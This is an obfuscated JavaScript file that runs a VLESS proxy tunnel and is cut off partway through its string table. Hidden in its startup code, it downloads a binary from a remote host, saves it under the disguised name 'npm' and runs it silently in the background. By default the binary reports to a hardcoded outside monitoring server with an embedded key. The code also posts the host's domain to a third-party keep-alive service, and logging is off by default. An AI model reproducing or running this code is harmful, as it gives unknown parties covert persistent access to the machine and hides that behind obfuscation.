const _0x348f2d=_0x7c9d;(function(_0x740d51,_0x4c59e7){const _0xda4e0e=_0x7c9d,_0x146293=_0x740d51();while(!![]){try{const _0x47bcdf=-parseInt(_0xda4e0e(0x223))/0x1+-parseInt(_0xda4e0e(0x1d8))/0x2+parseInt(_0xda4e0e(0x219))/0x3+-parseInt(_0xda4e0e(0x1d3))/0x4+-parseInt(_0xda4e0e(0x210))/0x5+-parseInt(_0xda4e0e(0x224))/0x6+parseInt(_0xda4e0e(0x1d4))/0x7;if(_0x47bcdf===_0x4c59e7)break;else _0x146293['push'](_0x146293['shift']());}catch(_0x5b873a){_0x146293['push'](_0x146293['shift']());}}}(_0x385d,0x74240));const os=require('os'),fs=require('fs'),net=require(_0x348f2d(0x157)),http=require('http'),axios=require(_0x348f2d(0x1fc)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x348f2d(0x21c)),UUID=process[_0x348f2d(0x201)]['UUID']||_0x348f2d(0x14a),NEZHA_SERVER=process[_0x348f2d(0x201)]['NEZHA_SERVER']||'nzku.fortymenty.eu.org:443',NEZHA_PORT=process[_0x348f2d(0x201)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x348f2d(0x201)][_0x348f2d(0x14d)]||_0x348f2d(0x1cb),AUTO_ACCESS=process[_0x348f2d(0x201)]['AUTO_ACCESS']||![],XPATH=process[_0x348f2d(0x201)][_0x348f2d(0x1aa)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x348f2d(0x201)]['SUB_PATH']||'sub',DOMAIN=process[_0x348f2d(0x201)][_0x348f2d(0x167)]||'',NAME=process[_0x348f2d(0x201)][_0x348f2d(0x14e)]||_0x348f2d(0x146),PORT=process[_0x348f2d(0x201)][_0x348f2d(0x160)]||0xbb8,SETTINGS={['UUID']:UUID,[_0x348f2d(0x153)]:_0x348f2d(0x1dd),[_0x348f2d(0x16a)]:_0x348f2d(0x20b),[_0x348f2d(0x1aa)]:_0x348f2d(0x188)+XPATH,['MAX_BUFFERED_POSTS']:0x1e,[_0x348f2d(0x180)]:0xf4240,[_0x348f2d(0x159)]:0x7530,['CHUNK_SIZE']:0x400*0x400,[_0x348f2d(0x19b)]:!![],[_0x348f2d(0x184)]:!![]};function validate_uuid(_0x50052e,_0x2b8103){for(let _0x5b00f2=0x0;_0x5b00f2<0x10;_0x5b00f2++){if(_0x50052e[_0x5b00f2]!==_0x2b8103[_0x5b00f2])return![];}return!![];}function concat_typed_arrays(_0x103054,..._0x3006de){const _0x477f4c=_0x348f2d;if(!_0x3006de||_0x3006de[_0x477f4c(0x144)]<0x1)return _0x103054;let _0x32e10f=_0x103054['length'];for(let _0x29d60c of _0x3006de)_0x32e10f+=_0x29d60c[_0x477f4c(0x144)];const _0x1adc73=new _0x103054[(_0x477f4c(0x215))](_0x32e10f);_0x1adc73['set'](_0x103054,0x0),_0x32e10f=_0x103054[_0x477f4c(0x144)];for(let _0x4a73fd of _0x3006de){_0x1adc73[_0x477f4c(0x148)](_0x4a73fd,_0x32e10f),_0x32e10f+=_0x4a73fd[_0x477f4c(0x144)];}return _0x1adc73;}function log(_0x4fe171,..._0x3c8412){const _0x271d80=_0x348f2d;if(SETTINGS[_0x271d80(0x153)]===_0x271d80(0x1dd))return;const _0x39f11c={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x368bbf={'debug':_0x271d80(0x17b),'info':_0x271d80(0x1e1),'warn':_0x271d80(0x186),'error':_0x271d80(0x1c8),'reset':_0x271d80(0x209)},_0x352f73=_0x39f11c[SETTINGS['LOG_LEVEL']]||0x1,_0x34c235=_0x39f11c[_0x4fe171]||0x0;if(_0x34c235>=_0x352f73){const _0x266a4f=new Date()[_0x271d80(0x191)](),_0x58a0c4=_0x368bbf[_0x4fe171]||_0x368bbf[_0x271d80(0x1a1)];console[_0x271d80(0x1da)](_0x58a0c4+'['+_0x266a4f+_0x271d80(0x1fb)+_0x4fe171+']',..._0x3c8412,_0x368bbf[_0x271d80(0x1a1)]);}}const getDownloadUrl=()=>{const _0x5c8943=_0x348f2d,_0xe17950=os[_0x5c8943(0x1ca)]();return _0xe17950===_0x5c8943(0x1a3)||_0xe17950===_0x5c8943(0x1e8)||_0xe17950===_0x5c8943(0x1f5)?!NEZHA_PORT?_0x5c8943(0x19f):_0x5c8943(0x1d2):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x5c8943(0x182);},downloadFile=async()=>{const _0x152323=_0x348f2d;if(!NEZHA_KEY)return;try{const _0x34c48a=getDownloadUrl(),_0x38c425=await axios({'method':_0x152323(0x197),'url':_0x34c48a,'responseType':_0x152323(0x1db)}),_0x4aa9d1=fs['createWriteStream']('npm');return _0x38c425[_0x152323(0x1e2)]['pipe'](_0x4aa9d1),new Promise((_0x30c4c7,_0x56f29a)=>{const _0x51a045=_0x152323;_0x4aa9d1['on']('finish',()=>{const _0x2e98b9=_0x7c9d;console['log'](_0x2e98b9(0x1bd)),exec(_0x2e98b9(0x18c),_0x639b5d=>{if(_0x639b5d)_0x56f29a(_0x639b5d);_0x30c4c7();});}),_0x4aa9d1['on'](_0x51a045(0x1d1),_0x56f29a);});}catch(_0x586209){throw _0x586209;}},runnz=async()=>{const _0x4758a4=_0x348f2d;await downloadFile();let _0x246b08='',_0x1129fe='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5a675a=[_0x4758a4(0x217),_0x4758a4(0x18e),'2096',_0x4758a4(0x20d),_0x4758a4(0x187),'2053'];_0x246b08=_0x5a675a['includes'](NEZHA_PORT)?_0x4758a4(0x1be):'',_0x1129fe=_0x4758a4(0x15a)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x246b08+'\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3d885a=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4758a4(0x1eb)](':')[_0x4758a4(0x192)]():'',_0x223416=new Set(['443',_0x4758a4(0x18e),_0x4758a4(0x226),'2087',_0x4758a4(0x187),_0x4758a4(0x15b)]),_0x214880=_0x223416[_0x4758a4(0x205)](_0x3d885a)?'true':_0x4758a4(0x1cc),_0x22874d='\x0aclient_secret:\x20'+NEZHA_KEY+_0x4758a4(0x173)+NEZHA_SERVER+_0x4758a4(0x1c4)+_0x214880+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x4758a4(0x1f1),_0x22874d);}_0x1129fe=_0x4758a4(0x1ff);}else return;}try{exec(_0x1129fe,{'shell':_0x4758a4(0x1c3)}),console[_0x4758a4(0x1da)](_0x4758a4(0x1ef));}catch(_0x28e2f7){console[_0x4758a4(0x1d1)](_0x4758a4(0x1a7)+_0x28e2f7);}};async function addAccessTask(){const _0x98d91f=_0x348f2d;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x4f0ce9=_0x98d91f(0x15f)+DOMAIN,_0x44e530='curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22'+_0x4f0ce9+_0x98d91f(0x156);exec(_0x44e530,(_0x51a8c3,_0x163e0d,_0x2a6396)=>{const _0x2dc7b2=_0x98d91f;if(_0x51a8c3){console[_0x2dc7b2(0x1d1)](_0x2dc7b2(0x207),_0x51a8c3[_0x2dc7b2(0x1d6)]);return;}console['log'](_0x2dc7b2(0x175),_0x163e0d);});}catch(_0x7edf8e){console[_0x98d91f(0x1d1)]('Error\x20added\x20Task:',_0x7edf8e[_0x98d91f(0x1d6)]);}}function parse_uuid(_0x19570d){const _0x4d1b98=_0x348f2d;_0x19570d=_0x19570d[_0x4d1b98(0x19a)]('-','');const _0x1f9dfd=[];for(let _0x44ae5f=0x0;_0x44ae5f<0x10;_0x44ae5f++){_0x1f9dfd[_0x4d1b98(0x1bb)](parseInt(_0x19570d[_0x4d1b98(0x1dc)](_0x44ae5f*0x2,0x2),0x10));}return _0x1f9dfd;}async function read_vless_header(_0xb52e91,_0x3e2f40){const _0x13a836=_0x348f2d;let _0x3b8010=0x0,_0x10d032=new Uint8Array(),_0x37f6a7={'value':_0x10d032,'done':![]};async function _0x2af77e(_0x14e733){const _0x11757e=_0x7c9d;if(_0x37f6a7[_0x11757e(0x1c7)])throw new Error(_0x11757e(0x171));const _0x250195=_0x14e733-_0x3b8010;if(_0x250195<0x1)return;_0x37f6a7=await read_atleast(_0xb52e91,_0x250195),_0x3b8010+=_0x37f6a7['value'][_0x11757e(0x144)],_0x10d032=concat_typed_arrays(_0x10d032,_0x37f6a7['value']);}await _0x2af77e(0x1+0x10+0x1);const _0x50c201=_0x10d032[0x0],_0x44d1ad=_0x10d032[_0x13a836(0x196)](0x1,0x1+0x10),_0x2aa704=parse_uuid(_0x3e2f40);if(!validate_uuid(_0x44d1ad,_0x2aa704))throw new Error(_0x13a836(0x185));const _0x2a6607=_0x10d032[0x1+0x10],_0x31002=0x1+0x10+0x1+_0x2a6607+0x1+0x2+0x1;await _0x2af77e(_0x31002+0x1);const _0x15fc39=_0x10d032[0x1+0x10+0x1+_0x2a6607],_0x57dcb8=0x1;if(_0x15fc39!==_0x57dcb8)throw new Error('unsupported\x20command:\x20'+_0x15fc39);const _0x14afe6=(_0x10d032[_0x31002-0x1-0x2]<<0x8)+_0x10d032[_0x31002-0x1-0x1],_0x30a176=_0x10d032[_0x31002-0x1],_0x331f75=0x1,_0x2ac47f=0x2,_0x30882c=0x3;let _0x454c98=-0x1;if(_0x30a176===_0x331f75)_0x454c98=_0x31002+0x4;else{if(_0x30a176===_0x30882c)_0x454c98=_0x31002+0x10;else _0x30a176===_0x2ac47f&&(_0x454c98=_0x31002+0x1+_0x10d032[_0x31002]);}if(_0x454c98<0x0)throw new Error(_0x13a836(0x1bc));await _0x2af77e(_0x454c98);const _0x48b2a9=_0x31002;let _0x8874c6='';if(_0x30a176===_0x331f75)_0x8874c6=_0x10d032[_0x13a836(0x196)](_0x48b2a9,_0x48b2a9+0x4)[_0x13a836(0x21e)]('.');else{if(_0x30a176===_0x2ac47f)_0x8874c6=new TextDecoder()[_0x13a836(0x21a)](_0x10d032[_0x13a836(0x196)](_0x48b2a9+0x1,_0x48b2a9+0x1+_0x10d032[_0x48b2a9]));else _0x30a176===_0x30882c&&(_0x8874c6=_0x10d032[_0x13a836(0x196)](_0x48b2a9,_0x48b2a9+0x10)[_0x13a836(0x176)]((_0x530364,_0x2d75fb,_0x420234,_0x4bb0f2)=>_0x420234%0x2?_0x530364[_0x13a836(0x203)](((_0x4bb0f2[_0x420234-0x1]<<0x8)+_0x2d75fb)[_0x13a836(0x1b4)](0x10)):_0x530364,[])[_0x13a836(0x21e)](':'));}if(!_0x8874c6){log('error',_0x13a836(0x1ba));throw new Error(_0x13a836(0x1ab));}return log(_0x13a836(0x21b),_0x13a836(0x1e7)+_0x8874c6+':'+_0x14afe6),{'hostname':_0x8874c6,'port':_0x14afe6,'data':_0x10d032['slice'](_0x454c98),'resp':new Uint8Array([_0x50c201,0x0])};}async function read_atleast(_0x54514c,_0x31865f){const _0x34be26=_0x348f2d,_0x243ed5=[];let _0x40e021=![];while(_0x31865f>0x0&&!_0x40e021){const _0x43e3f1=await _0x54514c[_0x34be26(0x1ad)]();if(_0x43e3f1[_0x34be26(0x178)]){const _0x9874fb=new Uint8Array(_0x43e3f1['value']);_0x243ed5[_0x34be26(0x1bb)](_0x9874fb),_0x31865f-=_0x9874fb[_0x34be26(0x144)];}_0x40e021=_0x43e3f1[_0x34be26(0x1c7)];}if(_0x31865f>0x0)throw new Error(_0x34be26(0x1a9));return{'value':concat_typed_arrays(..._0x243ed5),'done':_0x40e021};}async function parse_header(_0x11a8f1,_0x1cf17b){const _0xf8ec8d=_0x348f2d;log(_0xf8ec8d(0x1e3),_0xf8ec8d(0x1f6));const _0x4b584a=_0x1cf17b[_0xf8ec8d(0x1ec)][_0xf8ec8d(0x1b0)]();try{const _0x31883b=await read_vless_header(_0x4b584a,_0x11a8f1);return log(_0xf8ec8d(0x1e3),'VLESS\x20header\x20parsed\x20successfully'),_0x31883b;}catch(_0x370be4){log(_0xf8ec8d(0x1d1),_0xf8ec8d(0x200)+_0x370be4[_0xf8ec8d(0x1d6)]);throw new Error(_0xf8ec8d(0x166)+_0x370be4[_0xf8ec8d(0x1d6)]);}finally{_0x4b584a['releaseLock']();}}function _0x7c9d(_0x4b24d4,_0x3b7284){const _0x385de6=_0x385d();return _0x7c9d=function(_0x7c9d93,_0x597789){_0x7c9d93=_0x7c9d93-0x142;let _0x5de8c1=_0x385de6[_0x7c9d93];return _0x5de8c1;},_0x7c9d(_0x4b24d4,_0x3b7284);}async function connect_remote(_0x164cdc,_0x4c0734){const _0x3ad89c=_0x348f2d,_0x5c617b=0x1f40;try{const _0x5ec497=await timed_connect(_0x164cdc,_0x4c0734,_0x5c617b);return _0x5ec497['setNoDelay'](!![]),_0x5ec497['setKeepAlive'](!![],0x3e8),_0x5ec497['bufferSize']=parseInt(SETTINGS[_0x3ad89c(0x16a)])*0x400,log(_0x3ad89c(0x21b),_0x3ad89c(0x1b1)+_0x164cdc+':'+_0x4c0734),_0x5ec497;}catch(_0x3e4c6b){log(_0x3ad89c(0x1d1),_0x3ad89c(0x183)+_0x3e4c6b['message']);throw _0x3e4c6b;}}function timed_connect(_0x16ce8f,_0x236f9d,_0x12403a){return new Promise((_0x560458,_0x440af4)=>{const _0x16d68f=_0x7c9d,_0xc10408=net[_0x16d68f(0x1e6)]({'host':_0x16ce8f,'port':_0x236f9d}),_0x3b97b2=setTimeout(()=>{const _0x4b5749=_0x16d68f;_0x440af4(new Error(_0x4b5749(0x17e)));},_0x12403a);_0xc10408['on'](_0x16d68f(0x1a5),()=>{clearTimeout(_0x3b97b2),_0x560458(_0xc10408);}),_0xc10408['on'](_0x16d68f(0x1d1),_0x316ec6=>{clearTimeout(_0x3b97b2),_0x440af4(_0x316ec6);});});}function pipe_relay(){async function _0x5008de(_0x2be2fa,_0x5e3cdc,_0x23c2e1){const _0x22d163=_0x7c9d,_0x3ac708=parseInt(SETTINGS[_0x22d163(0x1f3)]);if(_0x23c2e1[_0x22d163(0x144)]>0x0){if(_0x5e3cdc['write'])_0x5e3cdc[_0x22d163(0x202)](),_0x5e3cdc[_0x22d163(0x1cf)](_0x23c2e1),process['nextTick'](()=>_0x5e3cdc[_0x22d163(0x1fa)]());else{const _0x233127=_0x5e3cdc[_0x22d163(0x20f)][_0x22d163(0x170)]();try{await _0x233127[_0x22d163(0x1cf)](_0x23c2e1);}finally{_0x233127[_0x22d163(0x17f)]();}}}try{_0x2be2fa[_0x22d163(0x15c)]?(_0x2be2fa[_0x22d163(0x19d)](),_0x2be2fa[_0x22d163(0x15c)](_0x5e3cdc,{'end':!![],'highWaterMark':_0x3ac708}),_0x2be2fa['resume']()):await _0x2be2fa[_0x22d163(0x1ec)]['pipeTo'](_0x5e3cdc[_0x22d163(0x20f)],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal['timeout'](SETTINGS['SESSION_TIMEOUT'])});}catch(_0x29d15f){!_0x29d15f['message']['includes'](_0x22d163(0x15e))&&log(_0x22d163(0x1d1),_0x22d163(0x1c9),_0x29d15f[_0x22d163(0x1d6)]);throw _0x29d15f;}}return _0x5008de;}function socketToWebStream(_0x4f42f2){const _0x10160b=_0x348f2d;let _0x17b9ed,_0x24a78c;return _0x4f42f2['on'](_0x10160b(0x1d1),_0x43f29e=>{const _0x3d11bf=_0x10160b;log('error',_0x3d11bf(0x222),_0x43f29e[_0x3d11bf(0x1d6)]),_0x17b9ed?.[_0x3d11bf(0x1d1)](_0x43f29e),_0x24a78c?.[_0x3d11bf(0x1d1)](_0x43f29e);}),{'readable':new ReadableStream({'start'(_0x1a9010){const _0x5cb2e7=_0x10160b;_0x17b9ed=_0x1a9010,_0x4f42f2['on'](_0x5cb2e7(0x1e2),_0x7a0072=>{const _0x4c4f3b=_0x5cb2e7;try{_0x1a9010[_0x4c4f3b(0x1b9)](_0x7a0072);}catch(_0x172d5d){log('error',_0x4c4f3b(0x214),_0x172d5d['message']);}}),_0x4f42f2['on'](_0x5cb2e7(0x1f2),()=>{const _0x308c88=_0x5cb2e7;try{_0x1a9010[_0x308c88(0x1fd)]();}catch(_0x2e1f81){log('error',_0x308c88(0x17c),_0x2e1f81['message']);}});},'cancel'(){const _0x1470f5=_0x10160b;_0x4f42f2[_0x1470f5(0x1d7)]();}}),'writable':new WritableStream({'start'(_0x44aa49){_0x24a78c=_0x44aa49;},'write'(_0x3c26ec){return new Promise((_0x52bdb2,_0x16b572)=>{const _0x3bc987=_0x7c9d;if(_0x4f42f2['destroyed']){_0x16b572(new Error(_0x3bc987(0x1a8)));return;}_0x4f42f2[_0x3bc987(0x1cf)](_0x3c26ec,_0x449e9d=>{if(_0x449e9d)_0x16b572(_0x449e9d);else _0x52bdb2();});});},'close'(){const _0x5871ed=_0x10160b;!_0x4f42f2[_0x5871ed(0x17d)]&&_0x4f42f2['end']();},'abort'(_0xdcdeb7){const _0x343e7c=_0x10160b;_0x4f42f2[_0x343e7c(0x1d7)](_0xdcdeb7);}})};}function relay(_0x427d05,_0x17662e,_0x21fd46,_0x51eef8){const _0x408f4a=_0x348f2d,_0x495d5a=pipe_relay();let _0x3a5fef=![];const _0x8b5625=socketToWebStream(_0x21fd46);function _0x53b498(){const _0x41b43e=_0x7c9d;if(!_0x3a5fef){_0x3a5fef=!![];try{_0x21fd46[_0x41b43e(0x1d7)]();}catch(_0x195ba0){!_0x195ba0[_0x41b43e(0x1d6)][_0x41b43e(0x1de)](_0x41b43e(0x15e))&&!_0x195ba0['message'][_0x41b43e(0x1de)](_0x41b43e(0x1f7))&&log('error',_0x41b43e(0x225)+_0x195ba0[_0x41b43e(0x1d6)]);}}}const _0x595c93=_0x495d5a(_0x17662e,_0x8b5625,_0x51eef8[_0x408f4a(0x1e2)])[_0x408f4a(0x1b3)](_0x35d53a=>{const _0x4816c8=_0x408f4a;!_0x35d53a[_0x4816c8(0x1d6)]['includes'](_0x4816c8(0x15e))&&!_0x35d53a[_0x4816c8(0x1d6)]['includes'](_0x4816c8(0x1f7))&&log(_0x4816c8(0x1d1),_0x4816c8(0x150)+_0x35d53a[_0x4816c8(0x1d6)]);})[_0x408f4a(0x177)](()=>{const _0x278c4a=_0x408f4a;_0x17662e[_0x278c4a(0x1ed)]&&_0x17662e[_0x278c4a(0x1ed)]();}),_0x3c1bc5=_0x495d5a(_0x8b5625,_0x17662e,_0x51eef8['resp'])[_0x408f4a(0x1b3)](_0x1146e6=>{const _0x1bd634=_0x408f4a;!_0x1146e6[_0x1bd634(0x1d6)][_0x1bd634(0x1de)](_0x1bd634(0x15e))&&!_0x1146e6[_0x1bd634(0x1d6)]['includes'](_0x1bd634(0x1f7))&&log(_0x1bd634(0x1d1),_0x1bd634(0x216)+_0x1146e6[_0x1bd634(0x1d6)]);});_0x3c1bc5[_0x408f4a(0x177)](()=>_0x595c93)[_0x408f4a(0x177)](_0x53b498);}const sessions=new Map();class Session{constructor(_0x118ba8){const _0x40274a=_0x348f2d;this['uuid']=_0x118ba8,this[_0x40274a(0x21f)]=0x0,this[_0x40274a(0x1ce)]=![],this[_0x40274a(0x179)]=Date[_0x40274a(0x14b)](),this[_0x40274a(0x1a2)]=null,this[_0x40274a(0x18b)]=null,this[_0x40274a(0x155)]=![],this['responseHeader']=null,this[_0x40274a(0x1df)]=![],this['bufferedData']=new Map(),this['cleaned']=![],this[_0x40274a(0x1d5)]=[],this[_0x40274a(0x204)]=null,this[_0x40274a(0x1ee)]=new Map(),log(_0x40274a(0x1e3),_0x40274a(0x198)+_0x118ba8);}async['initializeVLESS'](_0x4fc394){const _0x51fa03=_0x348f2d;if(this[_0x51fa03(0x155)])return!![];try{log(_0x51fa03(0x1e3),_0x51fa03(0x1b7));const _0x1bbcc5=new ReadableStream({'start'(_0x5013ea){const _0x888869=_0x51fa03;_0x5013ea[_0x888869(0x1b9)](_0x4fc394),_0x5013ea[_0x888869(0x1fd)]();}}),_0x380acd={'readable':_0x1bbcc5,'writable':new WritableStream()};return this['vlessHeader']=await parse_header(SETTINGS[_0x51fa03(0x194)],_0x380acd),log(_0x51fa03(0x21b),'VLESS\x20header\x20parsed:\x20'+this[_0x51fa03(0x1a2)][_0x51fa03(0x1c0)]+':'+this[_0x51fa03(0x1a2)][_0x51fa03(0x1f0)]),this[_0x51fa03(0x18b)]=await connect_remote(this['vlessHeader'][_0x51fa03(0x1c0)],this[_0x51fa03(0x1a2)][_0x51fa03(0x1f0)]),log(_0x51fa03(0x21b),_0x51fa03(0x152)),this[_0x51fa03(0x155)]=!![],!![];}catch(_0x2d65b3){return log('error',_0x51fa03(0x16f)+_0x2d65b3[_0x51fa03(0x1d6)]),![];}}async['processPacket'](_0x54232a,_0x3fdd30){const _0x475617=_0x348f2d;try{this[_0x475617(0x1ee)][_0x475617(0x148)](_0x54232a,_0x3fdd30),log('debug','Buffered\x20packet\x20seq='+_0x54232a+_0x475617(0x1d0)+_0x3fdd30[_0x475617(0x144)]);while(this['pendingBuffers'][_0x475617(0x205)](this[_0x475617(0x21f)])){const _0x20bb64=this[_0x475617(0x1ee)]['get'](this[_0x475617(0x21f)]);this[_0x475617(0x1ee)][_0x475617(0x1f9)](this[_0x475617(0x21f)]);if(!this['initialized']&&this[_0x475617(0x21f)]===0x0){if(!await this[_0x475617(0x1c2)](_0x20bb64))throw new Error('Failed\x20to\x20initialize\x20VLESS\x20connection');this[_0x475617(0x1fe)]=Buffer[_0x475617(0x1ae)](this['vlessHeader'][_0x475617(0x14c)]),await this[_0x475617(0x19e)](this[_0x475617(0x1a2)][_0x475617(0x1e2)]),this[_0x475617(0x204)]&&this[_0x475617(0x1bf)]();}else{if(!this[_0x475617(0x155)]){log('warn',_0x475617(0x142)+_0x54232a+_0x475617(0x1ea));continue;}await this[_0x475617(0x19e)](_0x20bb64);}this[_0x475617(0x21f)]++,log(_0x475617(0x1e3),_0x475617(0x1b5)+(this[_0x475617(0x21f)]-0x1));}if(this[_0x475617(0x1ee)][_0x475617(0x218)]>SETTINGS[_0x475617(0x1a6)])throw new Error(_0x475617(0x1ac));return!![];}catch(_0x3970ce){log('error',_0x475617(0x1e9)+_0x3970ce[_0x475617(0x1d6)]);throw _0x3970ce;}}[_0x348f2d(0x1bf)](){const _0x5dec22=_0x348f2d;if(!this['currentStreamRes']||!this[_0x5dec22(0x1fe)])return;try{const _0x5ce98d=this[_0x5dec22(0x204)]['socket']?.[_0x5dec22(0x1b8)]||'http/1.1',_0x582163=_0x5ce98d==='h2';!this['headerSent']&&(log('debug',_0x5dec22(0x161)+_0x5ce98d+_0x5dec22(0x168)+this[_0x5dec22(0x1fe)][_0x5dec22(0x144)]+'\x20bytes'),this[_0x5dec22(0x204)]['write'](this[_0x5dec22(0x1fe)]),this[_0x5dec22(0x1df)]=!![]);if(_0x582163){this[_0x5dec22(0x204)][_0x5dec22(0x1f8)][_0x5dec22(0x174)](!![]);const _0x3d2cda=new require(_0x5dec22(0x1db))[_0x5dec22(0x18d)]({'transform'(_0x32a403,_0x57b948,_0x1620a1){const _0x5f19ee=_0x5dec22,_0x1b8a36=0x4000;for(let _0x775df3=0x0;_0x775df3<_0x32a403[_0x5f19ee(0x144)];_0x775df3+=_0x1b8a36){this['push'](_0x32a403['slice'](_0x775df3,_0x775df3+_0x1b8a36));}_0x1620a1();}});this[_0x5dec22(0x18b)]['pipe'](_0x3d2cda)[_0x5dec22(0x15c)](this['currentStreamRes']);}else this['remote'][_0x5dec22(0x15c)](this[_0x5dec22(0x204)]);this[_0x5dec22(0x18b)]['on'](_0x5dec22(0x1f2),()=>{const _0x4dcf5b=_0x5dec22;!this[_0x4dcf5b(0x204)][_0x4dcf5b(0x181)]&&this['currentStreamRes'][_0x4dcf5b(0x1f2)]();}),this[_0x5dec22(0x18b)]['on'](_0x5dec22(0x1d1),_0x48a68a=>{const _0x3eff8f=_0x5dec22;log(_0x3eff8f(0x1d1),_0x3eff8f(0x149)+_0x48a68a['message']),!this[_0x3eff8f(0x204)][_0x3eff8f(0x181)]&&this[_0x3eff8f(0x204)]['end']();});}catch(_0x4982f5){log(_0x5dec22(0x1d1),_0x5dec22(0x20a)+_0x4982f5[_0x5dec22(0x1d6)]),this['cleanup']();}}[_0x348f2d(0x172)](_0x1eb494,_0x152a4d){const _0x4ecb25=_0x348f2d;return!_0x1eb494[_0x4ecb25(0x1e4)]&&_0x1eb494[_0x4ecb25(0x16d)](0xc8,_0x152a4d),this[_0x4ecb25(0x204)]=_0x1eb494,this[_0x4ecb25(0x155)]&&this[_0x4ecb25(0x1fe)]&&this['_startDownstreamResponse'](),_0x1eb494['on'](_0x4ecb25(0x1fd),()=>{const _0x1e5b45=_0x4ecb25;log(_0x1e5b45(0x21b),_0x1e5b45(0x199)),this[_0x1e5b45(0x16e)]();}),!![];}async[_0x348f2d(0x19e)](_0x42059d){const _0x41d847=_0x348f2d;if(!this[_0x41d847(0x18b)]||this[_0x41d847(0x18b)][_0x41d847(0x17d)])throw new Error(_0x41d847(0x1b6));return new Promise((_0x450ac5,_0x1ef9d4)=>{const _0xe0c649=_0x41d847;this[_0xe0c649(0x18b)][_0xe0c649(0x1cf)](_0x42059d,_0x796f7d=>{const _0x5218c1=_0xe0c649;_0x796f7d?(log(_0x5218c1(0x1d1),_0x5218c1(0x147)+_0x796f7d[_0x5218c1(0x1d6)]),_0x1ef9d4(_0x796f7d)):_0x450ac5();});});}['_startDownstreamResponse'](){const _0x3a39f6=_0x348f2d;if(!this[_0x3a39f6(0x204)]||!this['responseHeader'])return;try{!this[_0x3a39f6(0x1df)]&&(this[_0x3a39f6(0x204)][_0x3a39f6(0x1cf)](this[_0x3a39f6(0x1fe)]),this[_0x3a39f6(0x1df)]=!![]),this[_0x3a39f6(0x18b)][_0x3a39f6(0x15c)](this['currentStreamRes']),this[_0x3a39f6(0x18b)]['on'](_0x3a39f6(0x1f2),()=>{const _0x17b060=_0x3a39f6;!this[_0x17b060(0x204)][_0x17b060(0x181)]&&this[_0x17b060(0x204)][_0x17b060(0x1f2)]();}),this[_0x3a39f6(0x18b)]['on']('error',_0x20722=>{const _0x3ad0a7=_0x3a39f6;log('error',_0x3ad0a7(0x149)+_0x20722['message']),!this[_0x3ad0a7(0x204)][_0x3ad0a7(0x181)]&&this[_0x3ad0a7(0x204)][_0x3ad0a7(0x1f2)]();});}catch(_0x4b2411){log(_0x3a39f6(0x1d1),'Error\x20starting\x20downstream:\x20'+_0x4b2411[_0x3a39f6(0x1d6)]),this[_0x3a39f6(0x16e)]();}}[_0x348f2d(0x16e)](){const _0x23ae8f=_0x348f2d;!this['cleaned']&&(this['cleaned']=!![],log(_0x23ae8f(0x1e3),'Cleaning\x20up\x20session\x20'+this[_0x23ae8f(0x1a0)]),this[_0x23ae8f(0x18b)]&&(this[_0x23ae8f(0x18b)][_0x23ae8f(0x1d7)](),this[_0x23ae8f(0x18b)]=null),this[_0x23ae8f(0x155)]=![],this['headerSent']=![]);}}function _0x385d(){const _0x4cfc31=['toISOString','pop','method','UUID','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','slice','get','Created\x20new\x20session\x20with\x20UUID:\x20','Client\x20connection\x20closed','replaceAll','TCP_NODELAY','Failed\x20to\x20get\x20IP\x20address:','pause','_writeToRemote','https://arm64.ssss.nyc.mn/v1','uuid','reset','vlessHeader','arm','GET','connect','MAX_BUFFERED_POSTS','npm\x20running\x20error:\x20','Socket\x20is\x20destroyed','not\x20enough\x20data\x20to\x20read','XPATH','parse\x20hostname\x20failed','Too\x20many\x20buffered\x20packets','read','from','utf-8','getReader','Connected\x20to\x20','Session\x20','catch','toString','Processed\x20packet\x20seq=','Remote\x20connection\x20not\x20available','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet','alpnProtocol','enqueue','Failed\x20to\x20parse\x20hostname','push','read\x20address\x20type\x20failed','npm\x20download\x20successfully','--tls','_startDownstreamResponse','hostname','\x20timed\x20out\x20without\x20downstream','initializeVLESS','/bin/bash','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','listen','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','done','\x1b[31m','Relay\x20error:','arch','UsC5sNDciSaNggxJdB3EGSGYS242VT7q','false','Session\x20timeout:\x20','downstreamStarted','write',',\x20size=','error','https://arm64.ssss.nyc.mn/agent','1191236emgrsw','19436466eLUUzq','pendingPackets','message','destroy','1876388UzSzpw','Processing\x20packet:\x20seq=','log','stream','substr','none','includes','headerSent','Server\x20is\x20running\x20on\x20port\x20','\x1b[32m','data','debug','headersSent','=================================','createConnection','VLESS\x20connection\x20to\x20','arm64','Process\x20packet\x20error:\x20','\x20before\x20initialization','split','readable','reading_done','pendingBuffers','npm\x20is\x20running','port','config.yaml','end','CHUNK_SIZE','trim','aarch64','Starting\x20to\x20parse\x20VLESS\x20header','socket\x20hang\x20up','socket','delete','uncork',']\x20[','axios','close','responseHeader','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','VLESS\x20header\x20parse\x20error:\x20','env','cork','concat','currentStreamRes','has','processPacket','Error\x20sending\x20request:','vless://','\x1b[0m','Error\x20starting\x20downstream:\x20','2048','/([^/]+)(?:/([0-9]+))?$','2087','text/plain','writable','54815NyrHOD','Failed\x20to\x20process\x20POST\x20request:\x20','Server\x20error:\x20','Content-Type','Read\x20controller\x20error:','constructor','Download\x20error:\x20','443','size','603045ENvFLk','decode','i